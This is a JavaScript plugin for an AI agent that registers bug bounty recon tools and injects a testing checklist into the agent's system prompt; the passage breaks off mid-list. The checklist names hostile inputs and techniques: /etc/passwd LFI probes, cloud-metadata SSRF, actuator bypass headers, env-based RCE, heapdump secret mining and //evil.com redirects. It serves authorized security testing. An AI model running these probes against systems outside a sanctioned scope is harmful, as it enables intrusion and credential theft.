// dsh-bugbounty — keyless bug bounty recon & finding toolkit for DSH.
// Zero-import pure ESM: no @deepseek-ai/* imports; global fetch/AbortController
// only. Registers 28 `bb_*` tools (enum, probe, headers, tech, wayback, recon,
// checklist, source-audit, triage, actuator, js-secrets, 403-bypass, origin-ip,
// crlf, swagger, s3, punycode, mass-assign, email-payloads, nextjs-cve,
// ct-fresh-assets, wordpress, cache-deception, sqli-param-hunt, waf-fingerprint,
// cors-scan, git-exposure, sensitive-files)
// plus methodology guidance at systemPrompt
// order 115. Exports bbApi (neutral {name, execute} map) for reuse from other
// hosts (e.g. the OpenCode adapter).
export const name = "bugbounty";
export const inject = ["tools", "systemPrompt"];

const UA = "Mozilla/5.0 (DSH-BugBounty/1.0; keyless-recon)";
const MAX_TEXT = 7000;
const DOMAIN_RE = /^(?=.{1,253}$)[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?(\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)+$/;

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------

function renderLines(title, lines) {
	const text = [title, ...lines].join("\n");
	return [{ type: "text", text: text.length > MAX_TEXT ? `${text.slice(0, MAX_TEXT)}\n...(truncated)` : text }];
}

function shortErr(e) {
	const m = (e && e.message) || String(e);
	return m.split("\n")[0].slice(0, 160);
}

/** Per-fetch timeout wired to both a timer and the tool execution signal. */
function withBudget(exec, ms) {
	const controller = new AbortController();
	let onAbort;
	if (exec && exec.signal && typeof exec.signal.addEventListener === "function") {
		onAbort = () => controller.abort();
		if (exec.signal.aborted) controller.abort();
		else exec.signal.addEventListener("abort", onAbort, { once: true });
	}
	const timer = setTimeout(() => controller.abort(), ms);
	return {
		signal: controller.signal,
		dispose() {
			clearTimeout(timer);
			if (exec && exec.signal && onAbort && typeof exec.signal.removeEventListener === "function") {
				exec.signal.removeEventListener("abort", onAbort);
			}
		}
	};
}

/** Fetch a URL and return the response (does not consume the body). */
async function fetchRes(url, exec, { budget, redirect = "follow", headers = {} } = {}) {
	const b = withBudget(exec, budget);
	try {
		const res = await fetch(url, {
			signal: b.signal,
			redirect,
			headers: { "user-agent": UA, accept: "*/*", ...headers }
		});
		return { res };
	} finally {
		b.dispose();
	}
}

/** Fetch a URL and read its full text (for API endpoints). */
async function fetchText(url, exec, opts) {
	const { res } = await fetchRes(url, exec, opts);
	const text = await res.text();
	return { res, text };
}

/** Read at most `limit` bytes of a response body; tolerant of stream errors. */
async function readLimited(res, limit) {
	if (!res || !res.body) return "";
	try {
		const reader = res.body.getReader();
		const chunks = [];
		let total = 0;
		for (;;) {
			const { done, value } = await reader.read();
			if (done) break;
			chunks.push(value);
			total += value.length;
			if (total >= limit) break;
		}
		try { await reader.cancel(); } catch { /* stream may already be closed */ }
		const buf = new Uint8Array(Math.min(total, limit));
		let off = 0;
		for (const c of chunks) { buf.set(c, off); off += c.length; }
		return new TextDecoder().decode(buf);
	} catch {
		return "";
	}
}

function normalizeDomain(d) {
	return String(d ?? "").trim().toLowerCase().replace(/^https?:\/\//i, "").replace(/\/.*$/, "").replace(/^\.+/, "").replace(/\.+$/, "");
}

function normalizeUrl(u) {
	const s = String(u ?? "").trim();
	if (!/^https?:\/\//i.test(s)) throw new Error(`url must start with http:// or https:// (got "${s.slice(0, 60)}")`);
	return s;
}

function normPorts(raw) {
	if (raw === undefined) return [80, 443];
	if (!Array.isArray(raw)) throw new Error("ports must be an array of integers, e.g. [80,443]");
	const ports = raw.map((p) => {
		if (!Number.isInteger(p)) throw new Error(`ports must be integers (got ${JSON.stringify(p)})`);
		return p;
	});
	if (ports.length === 0) throw new Error("ports must not be empty");
	if (ports.length > 8) throw new Error("too many ports (max 8)");
	for (const p of ports) if (p < 1 || p > 65535) throw new Error(`port out of range 1-65535 (got ${p})`);
	return [...new Set(ports)];
}

function uniq(items) {
	return [...new Set(items)];
}

/** Run `fn` over items with bounded concurrency, preserving order. */
async function mapPool(items, limit, fn) {
	const results = new Array(items.length);
	let next = 0;
	const workers = Array.from({ length: Math.min(limit, items.length) }, async () => {
		for (;;) {
			const i = next++;
			if (i >= items.length) return;
			results[i] = await fn(items[i], i);
		}
	});
	await Promise.all(workers);
	return results;
}

function safeCookies(res) {
	try {
		if (typeof res.headers.getSetCookie === "function") return res.headers.getSetCookie();
	} catch { /* undici variants */ }
	const sc = res.headers.get("set-cookie");
	return sc ? [sc] : [];
}

/** Parse set-cookie headers into [{name, missing: []}] flag audits. */
function cookieFlags(res, isHttps) {
	return safeCookies(res).map((c) => {
		const parts = c.split(";");
		const name = (parts[0] || "").split("=")[0].trim();
		const attrs = parts.slice(1).map((p) => p.trim().toLowerCase());
		const missing = [];
		if (isHttps && !attrs.includes("secure")) missing.push("Secure");
		if (!attrs.some((a) => a === "httponly")) missing.push("HttpOnly");
		if (!attrs.some((a) => a.startsWith("samesite"))) missing.push("SameSite");
		return { name, missing };
	});
}

// ---------------------------------------------------------------------------
// recon data sources (keyless)
// ---------------------------------------------------------------------------

async function crtSh(domain, exec) {
	const { text } = await fetchText(`https://crt.sh/?q=%25.${encodeURIComponent(domain)}&output=json`, exec, { budget: 45000 });
	const data = JSON.parse(text);
	if (!Array.isArray(data)) throw new Error("crt.sh: unexpected response");
	const out = [];
	for (const entry of data) {
		const nv = String(entry && entry.name_value || "");
		for (const raw of nv.split(/\s+/)) {
			const nm = raw.toLowerCase().replace(/\.$/, "");
			if (!nm || nm.startsWith("*")) continue;
			if (nm === domain || nm.endsWith(`.${domain}`)) out.push(nm);
		}
	}
	return uniq(out);
}

async function hackerTarget(domain, exec) {
	const { text } = await fetchText(`https://api.hackertarget.com/hostsearch/?q=${encodeURIComponent(domain)}`, exec, { budget: 30000 });
	const out = [];
	for (const line of text.split("\n")) {
		const t = line.trim();
		if (!t) continue;
		const comma = t.indexOf(",");
		if (comma === -1) {
			// non-comma text = API error/limit response
			throw new Error(`hackertarget: ${t.slice(0, 120)}`);
		}
		const host = t.slice(0, comma).trim().toLowerCase();
		if (host === domain || host.endsWith(`.${domain}`)) out.push(host);
	}
	return uniq(out);
}

/** Passive subdomain enumeration shared by bb_enum_subdomains and bb_recon. */
async function enumSubdomains(domain, exec, cap) {
	const set = new Set();
	const sources = [];
	const errors = [];
	const attempts = [
		{ name: "crt.sh", run: () => crtSh(domain, exec) },
		{ name: "hackertarget", run: () => hackerTarget(domain, exec) }
	];
	for (const src of attempts) {
		try {
			const names = await src.run();
			if (names.length) {
				sources.push(src.name);
				for (const n of names) set.add(n);
			}
		} catch (e) {
			errors.push(`${src.name}: ${shortErr(e)}`);
		}
	}
	const sorted = [...set].sort();
	return { subdomains: sorted.slice(0, cap), sources, errors: errors.slice(0, 8) };
}

// ---------------------------------------------------------------------------
// tool implementations
// ---------------------------------------------------------------------------

/** One HTTP(S) attempt at host:port; never throws. */
async function probeOnce(host, scheme, port, exec) {
	const url = `${scheme}://${host}:${port}/`;
	const rec = { scheme, port, status: 0, ok: false, url, finalUrl: "", title: "", server: "", error: "" };
	try {
		const { res } = await fetchRes(url, exec, { budget: 10000, redirect: "follow" });
		rec.status = res.status;
		rec.ok = res.ok;
		rec.finalUrl = res.url || "";
		rec.server = res.headers.get("server") || "";
		const body = await readLimited(res, 65536);
		const m = /<title[^>]*>([\s\S]*?)<\/title>/i.exec(body);
		if (m) rec.title = m[1].replace(/<[^>]+>/g, "").replace(/\s+/g, " ").trim().slice(0, 200);
	} catch (e) {
		rec.error = shortErr(e);
	}
	return rec;
}

const SECURITY_HEADERS = [
	"content-security-policy",
	"strict-transport-security",
	"x-frame-options",
	"x-content-type-options",
	"referrer-policy",
	"permissions-policy",
	"cross-origin-opener-policy",
	"cross-origin-resource-policy",
	"cross-origin-embedder-policy"
];
const LEAK_HEADERS = ["server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version"];

/** Audit security headers / leak headers / cookie flags; never throws. */
async function securityHeaders(url, exec) {
	const base = { url, finalUrl: "", status: 0, headers: {}, missing: [], leaks: [], cookieFlags: [], error: "" };
	try {
		const { res } = await fetchRes(url, exec, { budget: 15000, redirect: "follow" });
		base.status = res.status;
		base.finalUrl = res.url || "";
		const headers = {};
		for (const [k, v] of res.headers.entries()) headers[k.toLowerCase()] = String(v).slice(0, 200);
		base.headers = headers;
		base.missing = SECURITY_HEADERS.filter((h) => !headers[h.toLowerCase()]);
		base.leaks = LEAK_HEADERS.filter((h) => headers[h.toLowerCase()]).map((h) => ({ name: h, value: headers[h.toLowerCase()].slice(0, 120) }));
		base.cookieFlags = cookieFlags(res, url.startsWith("https://"));
	} catch (e) {
		base.error = shortErr(e);
	}
	return base;
}

const TECH_FINGERPRINTS = [
	// server header
	{ category: "web-server", name: "nginx", test: (h) => (h["server"] || "").toLowerCase().includes("nginx") },
	{ category: "web-server", name: "Apache", test: (h) => (h["server"] || "").toLowerCase().includes("apache") },
	{ category: "web-server", name: "OpenResty", test: (h) => (h["server"] || "").toLowerCase().includes("openresty") },
	{ category: "cdn", name: "Cloudflare", test: (h) => (h["server"] || "").toLowerCase().includes("cloudflare") || Boolean(h["cf-ray"]) },
	{ category: "web-server", name: "IIS", test: (h) => /microsoft-iis| iis\b|^iis\b/.test((h["server"] || "").toLowerCase()) },
	{ category: "web-server", name: "Caddy", test: (h) => (h["server"] || "").toLowerCase().includes("caddy") },
	{ category: "web-server", name: "Gunicorn", test: (h) => (h["server"] || "").toLowerCase().includes("gunicorn") },
	{ category: "web-server", name: "Uvicorn", test: (h) => (h["server"] || "").toLowerCase().includes("uvicorn") },
	{ category: "web-server", name: "Envoy", test: (h) => (h["server"] || "").toLowerCase().includes("envoy") },
	{ category: "paas", name: "Netlify", test: (h) => (h["server"] || "").toLowerCase().includes("netlify") || Boolean(h["x-nf-request-id"]) },
	{ category: "paas", name: "GitHub Pages", test: (h) => (h["server"] || "").toLowerCase().includes("github") },
	{ category: "cdn", name: "AWS CloudFront", test: (h) => Boolean(h["x-amz-cf-id"]) || (h["server"] || "").toLowerCase().includes("cloudfront") },
	// powered-by / language hints
	{ category: "language", name: "PHP", test: (h) => (h["x-powered-by"] || "").toLowerCase().includes("php") },
	{ category: "language", name: "ASP.NET", test: (h) => (h["x-powered-by"] || "").toLowerCase().includes("asp.net") || Boolean(h["x-aspnet-version"]) },
	{ category: "framework", name: "Express.js", test: (h) => (h["x-powered-by"] || "").toLowerCase().includes("express") },
	{ category: "panel", name: "Plesk", test: (h) => (h["x-powered-by"] || "").toLowerCase().includes("plesklin") },
	// cache layers
	{ category: "cache", name: "Varnish", test: (h) => (h["via"] || "").toLowerCase().includes("varnish") },
	{ category: "cache", name: "Squid", test: (h) => (h["via"] || "").toLowerCase().includes("squid") },
	{ category: "paas", name: "Vercel", test: (h) => Boolean(h["x-vercel-id"] || h["x-vercel-cache"] || h["x-vercel-deployment-url"]) }
];

const BODY_PATTERNS = [
	{ category: "cms", name: "WordPress", re: /<meta[^>]+name=["']generator["'][^>]+content=["']wordpress/i, hint: "wp-content/wp-includes" },
	{ category: "framework", name: "Next.js", hint: "__NEXT_DATA__" },
	{ category: "framework", name: "Nuxt.js", hint: "__NUXT__" },
	{ category: "analytics", name: "GTM/GA", hint: "dataLayer+googletagmanager" },
	{ category: "cms", name: "Drupal", re: /drupal|sites\/all\/modules/i },
	{ category: "cms", name: "Joomla", re: /Joomla!/i },
	{ category: "frontend", name: "Bootstrap", hint: "bootstrap.min.css" },
	{ category: "frontend", name: "jQuery", re: /src=["']?[^"']*jquery[^"']*\.js/i },
	{ category: "framework", name: "React", hint: "data-reactroot" }
];

const COOKIE_TECH = [
	{ category: "language", name: "PHP", token: "phpsessid" },
	{ category: "language", name: "Java", token: "jsessionid" },
	{ category: "framework", name: "Django", token: "csrftoken" },
	{ category: "framework", name: "Laravel", token: "laravel_session" },
	{ category: "framework", name: "Express.js", token: "connect.sid" },
	{ category: "language", name: "ASP.NET", token: "asp.net_sessionid" },
	{ category: "cms", name: "WordPress", token: "wordpress_test_cookie" }
];

/** Fingerprint headers + body; never throws. */
async function techDetect(url, exec) {
	const base = { url, status: 0, tech: [], error: "" };
	try {
		const { res } = await fetchRes(url, exec, { budget: 15000, redirect: "follow" });
		base.status = res.status;
		const body = await readLimited(res, 200000);
		const h = {};
		for (const [k, v] of res.headers.entries()) h[k.toLowerCase()] = String(v);
		const cookieStr = safeCookies(res).join("; ").toLowerCase();
		const tech = [];
		const push = (category, name, evidence) => {
			if (!tech.some((t) => t.name === name)) tech.push({ category, name, evidence: String(evidence).slice(0, 160) });
		};
		for (const f of TECH_FINGERPRINTS) {
			if (f.test(h)) push(f.category, f.name, h["server"] || h["x-powered-by"] || h["via"] || "header fingerprint");
		}
		for (const c of COOKIE_TECH) {
			if (cookieStr.includes(c.token)) push(c.category, c.name, `${c.token} cookie`);
		}
		if ((h["x-powered-by"] || "").toLowerCase().includes("plesklin")) push("panel", "Plesk", h["x-powered-by"]);
		for (const p of BODY_PATTERNS) {
			if (p.hint && body.includes(p.hint)) push(p.category, p.name, p.hint);
			else if (p.re && p.re.test(body)) push(p.category, p.name, p.re.source.slice(0, 80));
		}
		if (h["x-generator"]) push("other", h["x-generator"], "x-generator");
		base.tech = tech.slice(0, 25);
	} catch (e) {
		base.error = shortErr(e);
	}
	return base;
}

const INTERESTING_PARAMS = ["id", "file", "redirect", "url", "next", "token", "auth", "password", "download", "admin", "login", "upload", "api", "debug", "q", "page", "view", "action", "cmd", "exec", "include", "key", "access", "session", "user", "email", "search"];
const INTERESTING_PATH_RE = /(\.js$|\.json$|\.env$|\.git|backup|phpmyadmin|wp-admin|wp-content|\.sql$|\.bak$|swagger|graphql|\/api\/|admin|login|upload|debug|test|config)/i;

function interestingReason(u) {
	try {
		const parsed = new URL(u);
		for (const key of parsed.searchParams.keys()) {
			if (INTERESTING_PARAMS.includes(key.toLowerCase())) return `param "${key}"`;
		}
	} catch { /* not parseable */ }
	const m = INTERESTING_PATH_RE.exec(u);
	return m ? `path "${m[0]}"` : null;
}

const CHECKLIST = [
	{
		slug: "recon-passive",
		name: "Passive recon",
		description: "Gather attacker-visible surface without touching the target: DNS/CT logs, archives, certificates, ASN ranges.",
		checks: [
			"Run bb_enum_subdomains on the root domain (crt.sh CT logs + HackerTarget hostsearch)",
			"Run bb_wayback_urls to pull archived URLs, params, and old endpoints",
			"Enumerate ASN ranges with whois/RDAP and map them with shodan/censys-style lookups",
			"Check certificate transparency for SANs and wildcard certs",
			"List apex DNS records: MX, TXT (SPF/DMARC), NS, CNAME dangling candidates",
			"Merge passive sources: subfinder -all -recursive, assetfinder --subs-only, findomain, chaos -silent",
			"Pull subdomains from public APIs: Wayback CDX (fl=original&collapse=urlkey), crt.sh, VirusTotal, urlscan.io, CommonCrawl",
			"Scrape GitHub repos (github-subdomains -t <token>) and Shodan (shosubgo / shodan domain <d>) for extra hosts",
			"Map ASN/CIDR infra with asnmap -d <domain> | dnsx, amass intel -org/-cidr/-asn and correlate IPs from VT/OTX/urlscan",
			"httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 -silent | grep -v 404 — alive-filter live hosts across common ports on every collected subdomain"
		],
		techniques: ["bb_enum_subdomains", "bb_wayback_urls", "crt.sh", "HackerTarget", "RDAP/whois", "subfinder", "assetfinder", "findomain", "chaos", "github-subdomains", "shosubgo", "asnmap", "httpx-toolkit port sweep"]
	},
	{
		slug: "recon-active",
		name: "Active recon & content discovery",
		description: "Enumerate live hosts, ports, hidden paths, and parameters on the discovered surface.",
		checks: [
			"Run bb_probe_http on subdomains to find live hosts, titles, and server banners",
			"Run bb_recon to get a one-shot live-host + findings report for the whole domain",
			"Content discovery with ffuf/dirsearch wordlists (admin, api, backup, .git, swagger)",
			"Parameter discovery on interesting endpoints (id=, file=, url=, redirect=)",
			"Check http vs https: hosts reachable only over http often bypass HSTS/CSP",
			"Permute subdomains with alterx -pp + dnsx; brute-force with ffuf -u https://FUZZZ.target.com",
			"Port-scan live hosts: naabu -nmap-cli 'nmap -sV -SC', nmap -p- --min-rate 1000, masscan -p0-65535 --rate 100000",
			"Active crawling: katana -d 2, hakrawler; passive: gau, urlfinder; dedupe with urldedupe",
			"Hidden params with arjun (--passive -m GET,POST); sensitive files by extension grep (.env|.ini|.conf|.sql|...)",
			"JS mining: katana | grep .js | nuclei -t http/exposures/, LinkFinder, SecretFinder, grep aws_key/password/oauth",
			"Takeover check: subzy run --concurrency 100 --verify_ssl + can-i-take-over-xyz; .git via httpx -path /.git/config -ms [core]",
			"SQLi pipeline: gf sqli | uro | anew && sqlmap -m sqli.txt --batch --level 2 --risk 2; qsreplace time/error probes",
			"LFI probe: qsreplace /etc/passwd + match root:x:0:0; SSRF: qsreplace 169.254.169.254/latest/meta-data/ + match ami-id"
		],
		techniques: ["bb_probe_http", "bb_recon", "ffuf", "dirsearch", "katana", "alterx", "dnsx", "naabu", "masscan", "gau", "arjun", "LinkFinder", "SecretFinder", "subzy", "sqlmap", "qsreplace"]
	},
	{
		slug: "idor-bac",
		name: "IDOR / Broken Access Control",
		description: "The highest-payout bug class: object references that don't verify authorization.",
		checks: [
			"Enumerate numeric/UUID object IDs (id=, user_id=, order=) and swap them across accounts",
			"Test horizontal access: user A reads/modifies user B's resource",
			"Test vertical access: low-priv role calls admin endpoints directly",
			"Check API responses for other users' data in list/search endpoints",
			"Test HTTP method confusion: PUT/DELETE on GET-only endpoints, X-HTTP-Method-Override",
			"Test encoded object references (Base64 IDs): decode, swap digits, re-encode, re-fetch another user's resource",
			"Scale sequential-ID enumeration with Burp Intruder on trailing digits of encoded/numeric IDs",
			"Test destructive IDOR: cancellation/refund endpoints replaying another user's ID without ownership checks",
			"Test feedback/comment endpoints: swap userId to read others' PII (phone/email/org) or submit content as them",
			"Blind-XSS feedback fields (name/designation) to fire in an internal admin panel"
		],
		techniques: ["bb_wayback_urls (find id params)", "burp auth analyzer", "role swap", "method override", "Base64 ID swap", "Burp Intruder enumeration"]
	},
	{
		slug: "ssrf",
		name: "SSRF",
		description: "Server-side fetches of user-controlled URLs/params that reach internal infrastructure.",
		checks: [
			"Find fetch hooks: url=, uri=, next=, redirect=, webhook=, callback=, image=, proxy= params",
			"Feed internal addresses: 127.0.0.1, 169.254.169.254 (cloud metadata), ::1, 0.0.0.0",
			"Use DNS rebinding and URL-parser tricks (user@host, encoded dots, IPv6 forms)",
			"Check redirect-following: 302s to internal hosts from open redirects",
			"Prove impact: read cloud metadata, reach internal admin panels, port-scan localhost"
		],
		techniques: ["bb_wayback_urls (find url params)", "interactsh", "dns rebinding", "metadata endpoints"]
	},
	{
		slug: "auth-session",
		name: "Authentication & session management",
		description: "JWT handling, cookie flags, password reset, and MFA bypasses.",
		checks: [
			"JWT: try alg=none, weak secrets (hashcat), exp/iat tampering, kid/path traversal",
			"Cookie flags: verify Secure, HttpOnly, SameSite (check bb_security_headers output)",
			"Password reset: host header injection, token predictability, user enumeration",
			"MFA: bypass via response manipulation, forgot-password flows, backup codes",
			"Session fixation / concurrent session handling / session invalidation on logout",
			"Authentication bypass: default/debug creds, X-Forwarded-For / X-Original-URL bypass, cookie deletion, path normalization (/admin, /./admin, /%2e%2e/)",
			"Session lifecycle: password change / logout must invalidate ALL sessions (log in on two browsers, change password in one, refresh the other)",
			"Session fixation: record session ID pre-login, log in, compare — ID must rotate at auth and after privilege change",
			"Reset-token handling: old tokens must die on new request; tokens must be single-use (reuse the same link twice)",
			"Email verification must be tied to the CURRENT email state (verify B, revert to A; swap un-clicked links)",
			"JWT revocation: replay a logged-out JWT in Postman/Burp — server must reject (no blacklist = flaw)",
			"Check sensitive API endpoints validate session server-side, not just cookie presence (replay profile-save after logout)",
			"Test unlimited session duration / static remember-me tokens after hours-days of inactivity"
		],
		techniques: ["bb_security_headers", "jwt_tool", "hashcat", "host header injection", "EditThisCookie", "session lifecycle tests"]
	},
	{
		slug: "xss",
		name: "XSS",
		description: "Stored, reflected, and DOM XSS — plus CSP bypass, the usual escalation.",
		checks: [
			"Test every reflected parameter with context-aware payloads (html, attr, js, json)",
			"Look for stored sinks: profile fields, comments, file names, error messages",
			"Audit DOM sinks: location, innerHTML, eval, document.write, postMessage handlers",
			"Attempt CSP bypass: JSONP, angular expressions, unsafe-inline gadgets",
			"Escalate: steal tokens via injected JS, keylogging, CSRF token theft",
			"Passive XSS pipeline: gau | gf xss | uro | Gxss | kxss to harvest reflected unfiltered-char params",
			"Filter by content-type (text/html, svg, xml) with httpx-toolkit -ct to drop JSON/image noise",
			"Auto-exploit with dalfox pipe (--skip-bav --skip-mining-all; --custom-payload, --waf-evasion, --deep-domxss)",
			"Blind XSS: payloads in feedback/form fields + X-Forwarded-For header; OOB callbacks via dalfox --blind <collaborator>",
			"DOM XSS: audit sinks (location, innerHTML, eval, postMessage) with --deep-domxss and manual browser confirm",
			"Stored XSS mass hunt: gau/waybackurls | grep -iE '(login|signup|register|forgot|password|reset)' | nuclei -t http/xss/ -severity critical,high — stored sinks in auth/form pages",
			"DOM XSS pipeline: Gxss -c 100 | sort -u | dalfox pipe — auto-generate payload-injected URL variants and confirm DOM/reflected execution"
		],
		techniques: ["bb_wayback_urls (find params)", "burp collaborator", "XSS hunter", "CSP evaluator", "gau", "gf xss", "Gxss", "kxss", "dalfox", "httpx-toolkit -ct", "stored-XSS grep | nuclei critical,high"]
	},
	{
		slug: "sqli",
		name: "SQL injection",
		description: "Classic and blind injection across params, headers, and APIs.",
		checks: [
			"Test numeric/string params with error-based payloads (', \", OR 1=1)",
			"Blind detection: time-based (SLEEP/BENCHMARK) and boolean-based diffs",
			"Map DB type via error fingerprints (MySQL, Postgres, MSSQL, Oracle)",
			"Try WAF bypass: case mixing, comments, hex encoding, chunked encoding",
			"Extract data via UNION / error-based / stacked queries; document evidence"
		],
		techniques: ["sqlmap", "burp intruder", "error fingerprinting", "WAF bypass"]
	},
	{
		slug: "business-logic",
		name: "Business logic flaws",
		description: "Bugs in the rules: prices, quantities, limits, and race conditions.",
		checks: [
			"Price/quantity tampering on checkout; negative quantities; currency confusion",
			"Coupon/promo abuse: reuse, stack, apply to disallowed items",
			"Rate-limit gaps: signup, OTP resend, password reset, balance top-up",
			"Race conditions (TOCTOU): double-spend, double-claim, duplicate redemption",
			"Privilege flows: order status transitions, referral abuse, loyalty manipulation"
		],
		techniques: ["burp turbo intruder", "race condition patterns", "negative value fuzzing"]
	},
	{
		slug: "api-misconfig",
		name: "API misconfiguration",
		description: "Exposed API surface: open swagger, mass assignment, excessive data, graphql introspection.",
		checks: [
			"Find API docs: /swagger, /api-docs, /openapi.json, /graphql playground",
			"GraphQL: introspection, field suggestion, query depth/alias abuse",
			"Mass assignment: send extra fields (role=admin, isAdmin=true, balance=999)",
			"Excessive data: list endpoints returning internal fields; check .json/.xml accept headers",
			"Broken object/function level auth on API routes; unversioned deprecated endpoints"
		],
		techniques: ["bb_wayback_urls (find api paths)", "graphql introspection", "mass assignment", "ffuf api wordlists"]
	},
	{
		slug: "subdomain-takeover",
		name: "Subdomain takeover",
		description: "Dangling DNS pointing at a service you can claim.",
		checks: [
			"Find unparked CNAMEs pointing at cloud services (S3, Azure, Heroku, GitHub Pages, Fastly)",
			"Confirm NXDOMAIN/no content on the target while the apex is still delegated",
			"Check takeover fingerprints: 404 from S3 bucket name, 404 NoSuchBucket era patterns",
			"Claim the resource on free tiers and verify a file you upload is served",
			"Report impact: phishing, cookie scope, SEO poisoning",
			"subzy run --targets <file> --concurrency 100 --hide_fails --verify_ssl — automated CNAME + fingerprint takeover verification across the subdomain list"
		],
		techniques: ["bb_enum_subdomains", "dig CNAME", "nuclei takeover templates", "can-i-take-over-xyz", "subzy run --concurrency 100 --hide_fails --verify_ssl"]
	},
	{
		slug: "reporting",
		name: "Reporting & disclosure",
		description: "Turn a finding into a paid report: clear PoC, impact, remediation.",
		checks: [
			"Write a step-by-step PoC with exact requests/responses and a reproducible flow",
			"State business impact (data leaked, accounts taken over, $ lost) — this drives payout",
			"Suggest remediation for each root cause",
			"Check the program's scope, rules, and duplicate policy before submitting",
			"Keep a disclosure timeline if no-response: 30-90 day policy depending on program"
		],
		techniques: ["CVSS scoring", "hackerone/other program docs", "writeup templates"]
	},
	{
		slug: "csrf-open-redirect",
		name: "CSRF & open redirect",
		description: "State-changing requests without anti-CSRF protection, plus open redirects that chain into OAuth/SSRF/phishing.",
		checks: [
			"CSRF: state-changing requests (profile, email, password, transfer) missing anti-CSRF tokens; try cookie-less flows",
			"SameSite bypass: top-level GET navigation, subdomain-signed cookies, JSON content-type CSRF",
			"Open redirect: ?url= ?next= ?redirect= ?return= accepting //evil.com, \\\\evil.com, javascript:, encoded variants",
			"Chain open redirects into OAuth token/state leakage, SSRF via 302-to-internal, or credential phishing"
		],
		techniques: ["SameSite=lax bypass", "CORS audit", "OAuth redirect chain", "bb_wayback_urls (find redirect params)"]
	},
	{
		slug: "file-upload",
		name: "File upload vulnerabilities",
		description: "Upload filters that can be bypassed to run code, read files, or store XSS.",
		checks: [
			"Extension/content-type confusion: .php5 .phtml .svg, double extensions, trailing dots/spaces, null bytes",
			"Magic-byte spoofing and polyglot files (GIFAR); MIME sniffing after extension whitelist",
			"Path traversal in filename (..%2f, absolute paths) and symlink/zipslip on archive extraction",
			"Stored XSS via HTML/SVG upload; XXE or RCE via XML/SVG/ImageMagick parsing"
		],
		techniques: ["polyglot files", "magic byte spoofing", "ImageMagick/XML payloads", "zipslip"]
	},
	{
		slug: "engagement",
		name: "Target selection & engagement",
		description: "Scope compliance and discipline that keep a campaign legal, professional, and efficient.",
		checks: [
			"Verify program scope BEFORE any testing; pick programs with clear scope, decent reward-to-effort, responsive triage",
			"Never access data belonging to other users; stop immediately if real user data is reached",
			"Report confirmed vulnerabilities within 24 hours; no public disclosure before vendor acknowledgment",
			"Keep evidence (requests, responses, timeline) and a disclosure timeline if the program goes silent"
		],
		techniques: ["program docs (hackerone/bugcrowd)", "scope checker", "CVSS severity", "disclosure policy"]
	},
{
		slug: "registration-flows",
		name: "User Registration Flows",
		description: "Signup/registration bugs distilled from 'A Comprehensive Guide to Hunting Bugs in User Registration Features': account overwrite, case-shadow accounts, email verification bypass, client-side-only validation, route collisions, OTP brute, session fixation, punycode homograph takeover.",
		checks: [
			"Re-register an existing victim email with a different password and log in with the new one; look for account overwrite with no 'Email already exists' error",
			"Register case-shadow variants (Abc@example.com / aBc@example.com) when abc@example.com exists; look for overwrite or shadow duplicates from case-insensitive storage",
			"Intruder Numbers 1-1000 on the email param; look for hundreds of 200 OK without CAPTCHA/block",
			"Intercept signup POST, send empty username, 1-char password, invalid emails (test@test); look for successful registration despite broken frontend rules",
			"Flip is_verified false->true, status pending->success, 403->200, strip Location: /login; look for granted access",
			"Sign up attacker@mail.com, change email to victim@mail.com before clicking the link, then click the old link; look for victim email verified via stale token",
			"Register reserved usernames login/admin/api/dashboard/index.php/admin.aspx on profile-at-root apps; look for profile serving at system paths like target.tld/login.php",
			"Crawl legacy signup endpoints /api/v1/register, /auth/create, /user/create, /legacy/signup, /mobile/register; compare email-verification/rate-limit/password rules between endpoints",
			"Rapid sequential OTP guesses with IP rotation; look for missing lockout/throttling",
			"Compare session ID across signup->verification->onboarding and try reuse across accounts; look for unchanged session (fixation vector)",
			"Send attacker@mail.com%00victim@mail.com and username%00.jpg in signup fields; look for truncated storage/display",
			"Register аdmin@example.com (xn--dmin-7cd@example.com) vs admin@example.com; look for a normalization collision enabling takeover"
		],
		techniques: ["signup endpoint crawl (/api/v1/register, /auth/create, /user/create, /legacy/signup, /mobile/register)", "Burp Intruder numbers for OTP/rate-limit", "punycode homograph collider", "session fixation probes"]
	},
	{
		slug: "actuator",
		name: "Spring Boot Actuator",
		description: "Finding and exploiting exposed Spring Boot Actuator endpoints ('Actuator Unleashed'): full endpoint set probing, ACL bypass headers, path fuzz mutations, heapdump mining, Jolokia LFI and env RCE.",
		checks: [
			"Probe the full actuator endpoint set (/actuator, /env, /configprops, /beans, /mappings, /metrics, /loggers, /threaddump, /heapdump, /jolokia, /hawtio, /httptrace, /auditevents, /sessions, /shutdown, /prometheus, /conditions, /refresh, /restart, /env/{property}); look for 200/401/403",
			"Find Spring Boot targets with the Shodan favicon hash 116323821 using org: / ssl.cert.subject.CN: / hostname: filters",
			"Bypass actuator ACLs with X-Forwarded-For: 127.0.0.1 and X-Original-URL / X-Rewrite-URL: /actuator/env; look for 200 on protected endpoints",
			"Fuzz path bypasses (/actuator;/env, /actuator;jsessionid=1234/env, //actuator, /actuator//env, /actuator/., /%2e%2e/actuator, /actuator%2Fenv, /actuator%00, /actuator., /actuator.json, /actuator?path=env, /actuator%3Fenv) plus GET/HEAD/OPTIONS; compare statuses vs baseline 404",
			"Download /actuator/heapdump and mine with strings -a -n 6 + grep for AKIA[0-9A-Z]{16}, base64 JWTs, 20+ char tokens, password|secret|bearer|ssh-rsa; look for leaked credentials",
			"Test /actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd; look for 'root:' in the response (LFI)",
			"POST spring.datasource.hikari.connection-test-query to /actuator/env with CREATE ALIAS EXEC; look for command execution"
		],
		techniques: ["Shodan favicon hash 116323821", "X-Forwarded-For + X-Original-URL/X-Rewrite-URL ACL bypass", "jolokia/hawtio JMX chains", "heapdump strings mining", "spring.datasource env RCE"]
	},
	{
		slug: "js-recon",
		name: "JavaScript Recon & Secret Hunting",
		description: "Sensitive data in JS files ('How to Identify Sensitive Data in JavaScript Files') plus the 5-min workflow JS leg: collect with katana/gau, liveness-check, then jsleak / nuclei / lazyegg / EndPointer / gospider secret mining.",
		checks: [
			"Collect JS with katana -u <domain> -d 5 -jc and gau piped through anew; look for a deduplicated .js list including chunks and bundles",
			"Check liveness with httpx-toolkit -mc 200; only scan live JS files",
